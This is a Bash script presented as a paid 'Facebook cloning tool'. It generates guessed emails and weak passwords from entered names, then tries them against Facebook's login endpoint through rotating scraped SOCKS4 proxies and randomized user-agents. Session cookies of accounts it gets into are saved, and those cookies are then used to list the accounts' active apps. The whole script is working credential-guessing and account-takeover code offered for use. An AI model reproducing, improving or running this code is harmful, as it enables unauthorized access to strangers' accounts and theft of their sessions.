#!/bin/bash

# ============================================
# ALAMIN-XD FACEBOOK CLONING TOOL - BASH VERSION
# ============================================

# Warna untuk output
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Direktori kerja
BASE_DIR="/sdcard"
COOKIE_FILE="$BASE_DIR/ASR-EMAILok.txt"
CP_FILE="$BASE_DIR/ASR-EMAILcp.txt"
PROXY_FILE=".proxy.txt"
UA_FILE=".ua2.txt"

# Banner/Logo
show_banner() {
    clear
    echo -e "${GREEN}"
    echo " █████╗ ███████╗██████╗ "
    echo "██╔══██╗██╔════╝██╔══██╗"
    echo "███████║███████╗██████╔╝"
    echo "██╔══██║╚════██║██╔══██╗"
    echo "██║  ██║███████║██║  ██║"
    echo "╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${WHITE}══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}[💜] CREATED BY   : ${YELLOW}ALAMIN VAU${NC}"
    echo -e "${GREEN}[💜] FACEBOOK     : ${BLUE}Md. Al Amin Islam${NC}"
    echo -e "${GREEN}[💜] GITHUB       : ${PURPLE}ALAMIN-XD${NC}"
    echo -e "${GREEN}[💜] TOOL VERSION : ${CYAN}7.2${NC}"
    echo -e "${GREEN}[💜] TOOL TYPE    : ${GREEN}PAID${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════════════${NC}"
}

# Cek dependencies
check_dependencies() {
    local deps=("curl" "wget" "python3")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Installing dependencies...${NC}"
        
        if command -v pkg &>/dev/null; then
            pkg install -y "${missing[@]}" python
        elif command -v apt &>/dev/null; then
            apt update && apt install -y "${missing[@]}"
        fi
    fi
}

# Generate User-Agent
generate_ua() {
    local ua_list=(
        "Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A357"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"
    )
    
    echo "${ua_list[$RANDOM % ${#ua_list[@]}]}"
}

# Download proxy
download_proxy() {
    echo -e "${YELLOW}[*] Downloading proxies...${NC}"
    curl -s "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all" > "$PROXY_FILE"
    
    if [ -s "$PROXY_FILE" ]; then
        echo -e "${GREEN}[√] Proxies downloaded: $(wc -l < "$PROXY_FILE")${NC}"
    else
        echo -e "${RED}[!] Failed to download proxies${NC}"
    fi
}

# Get random proxy
get_random_proxy() {
    if [ -s "$PROXY_FILE" ]; then
        shuf -n 1 "$PROXY_FILE"
    else
        echo ""
    fi
}

# Cek akun Facebook
check_account() {
    local email="$1"
    local pass="$2"
    local proxy="$3"
    local ua="$4"
    
    local url="https://p.facebook.com/login.php"
    local login_data="email=$email&pass=$pass"
    
    local curl_cmd="curl -s -X POST '$url' \
        -H 'User-Agent: $ua' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-raw '$login_data' \
        --max-time 30"
    
    # Add proxy if available
    if [ -n "$proxy" ]; then
        curl_cmd="$curl_cmd --socks4 $proxy"
    fi
    
    local response=$(eval "$curl_cmd")
    
    # Cek jika login sukses (ada cookie c_user)
    if echo "$response" | grep -q "c_user"; then
        # Extract cookie
        local cookie=$(echo "$response" | grep -o "c_user=[^;]*" | head -1)
        
        if [ -n "$cookie" ]; then
            echo -e "${GREEN}[ASR-OK] $email | $pass${NC}"
            echo "$cookie" >> "$COOKIE_FILE"
            return 0
        fi
    fi
    
    echo -e "${RED}[ASR-CP] $email | $pass${NC}"
    echo "$email:$pass" >> "$CP_FILE"
    return 1
}

# Crack akun
crack_accounts() {
    local user="$1"
    local kode="$2"
    local domain="$3"
    local limit="$4"
    
    echo -e "${CYAN}[🔥] TOTAL ID:${GREEN} $limit${NC}"
    echo -e "${CYAN}[🔥] DOMAIN:${GREEN} $domain${NC}"
    echo -e "${CYAN}[🔥] CLONING HAS BEEN STARTED${NC}"
    echo -e "${GREEN}═════════════════════════════════════════════════════${NC}"
    
    # Download proxies
    download_proxy
    
    local count=0
    local ok=0
    local cp=0
    
    while [ $count -lt $limit ]; do
        # Generate email
        local num=$((RANDOM % 1000000 + 100000))
        local email="${user}${num}${domain}"
        
        # Generate password
        local pass="${user}${kode}${num}"
        
        # Get proxy and UA
        local proxy=$(get_random_proxy)
        local ua=$(generate_ua)
        
        # Check account
        echo -e "${WHITE}[SEARCHING] ${email}${NC}"
        
        if check_account "$email" "$pass" "$proxy" "$ua"; then
            ((ok++))
        else
            ((cp++))
        fi
        
        ((count++))
        
        # Progress
        echo -e "${BLUE}[PROGRESS] ${count}/${limit} | OK:${ok} | CP:${cp}${NC}"
        sleep 1
    done
    
    echo -e "${GREEN}═════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}[🙄] Crack process has been completed${NC}"
    echo -e "${YELLOW}[🙄] Ids saved in ASR-EMAILok.txt, ASR-EMAILcp.txt${NC}"
}

# Cek APK aktif
cek_apk() {
    local cookie="$1"
    
    echo -e "${CYAN}[*] Checking active apps...${NC}"
    
    # Using curl to check Facebook apps
    local response=$(curl -s "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active" \
        -H "Cookie: $cookie" \
        -H "User-Agent: $(generate_ua)")
    
    if echo "$response" | grep -q "No Active Apps"; then
        echo -e "${RED}[!] Sorry there is no Active Apk${NC}"
    else
        # Extract app names
        echo "$response" | grep -o '>[^<]*<' | sed 's/[<>]//g' | grep -v "^$" | head -20
    fi
}

# Menu utama
main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}"
        echo "  [1] RANDOM MAIL CLONING"
        echo "  [2] JOIN WHATSAPP"
        echo "  [0] Exit"
        echo -e "${NC}"
        
        read -p $'\033[1;36m[√] Choose : \033[0m' choice
        
        case $choice in
            1)
                random_cloning
                ;;
            2)
                xdg-open "https://chat.whatsapp.com/01915935712"
                ;;
            0)
                echo -e "${RED}[!] Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice!${NC}"
                sleep 1
                ;;
        esac
    done
}

# Random cloning menu
random_cloning() {
    echo -e "${CYAN}"
    read -p "[🍑] FAST NAME : " first_name
    read -p "[🍑] LAST NAME : " last_name
    read -p "[✉️] CHOSE DOMAIN (@gmail.com, @yahoo.com, etc) : " domain
    read -p "[••?] HOW MANY NUMBERS DO YOU WANT TO CLONE : " limit
    
    # Generate user combination
    local user_combinations=(
        "$first_name$last_name"
        "$first_name$last_name$first_name"
        "$first_name.$last_name"
        "$last_name$first_name"
        "$first_name"
        "$last_name"
    )
    
    # Generate password codes
    local kode_combinations=(
        "123"
        "1234"
        "12345"
        "$first_name"
        "$last_name"
    )
    
    # Select random combinations
    local user=${user_combinations[$RANDOM % ${#user_combinations[@]}]}
    local kode=${kode_combinations[$RANDOM % ${#kode_combinations[@]}]}
    
    # Start cracking
    crack_accounts "$user" "$kode" "$domain" "$limit"
    
    read -p $'\033[1;33mPress Enter to continue...\033[0m'
}

# Approval system
approval_system() {
    local uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "$RANDOM$RANDOM")
    
    echo -e "${YELLOW}[*] Checking approval...${NC}"
    
    # Check from GitHub
    local response=$(curl -s "https://github.com/ALAMIN-XD/Approval.txt/blob/main/Approval.txt")
    
    if echo "$response" | grep -q "$uuid"; then
        echo -e "${GREEN}[√] Your Key is Successfully Approved${NC}"
        return 0
    else
        echo -e "${RED}[!] Your Token : $uuid${NC}"
        echo -e "${YELLOW}[!] NOTE THIS TOOL IS PAID YOU NEED APPROVAL${NC}"
        echo -e "${RED}[!] Your Subscription Date Expire${NC}"
        echo -e "${CYAN}[!] FB ID LINK > https://www.facebook.com/Termux.User.Tera.Next.Pappa${NC}"
        
        read -p $'\033[1;33mIF U NEED APPROVE THEN PRESS ENTER WHATS APP WILL OPEN \033[0m'
        
        # Open WhatsApp for approval
        local message="Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20$uuid"
        xdg-open "https://wa.me/+8801915935712?text=$message"
        
        exit 1
    fi
}

# Inisialisasi
initialize() {
    check_dependencies
    approval_system
    
    # Create necessary files
    touch "$COOKIE_FILE" "$CP_FILE" "$PROXY_FILE" "$UA_FILE"
    
    echo -e "${GREEN}[√] Initialization complete${NC}"
    sleep 2
}

# Trap Ctrl+C
trap ctrl_c INT
ctrl_c() {
    echo -e "\n${RED}[!] Interrupted by user${NC}"
    echo -e "${YELLOW}[*] Saving session...${NC}"
    exit 1
}

# Main execution
if [[ "$1" == "--test" ]]; then
    # Test mode
    check_account "test@example.com" "password123" "" "$(generate_ua)"
else
    # Normal mode
    initialize
    main_menu
fi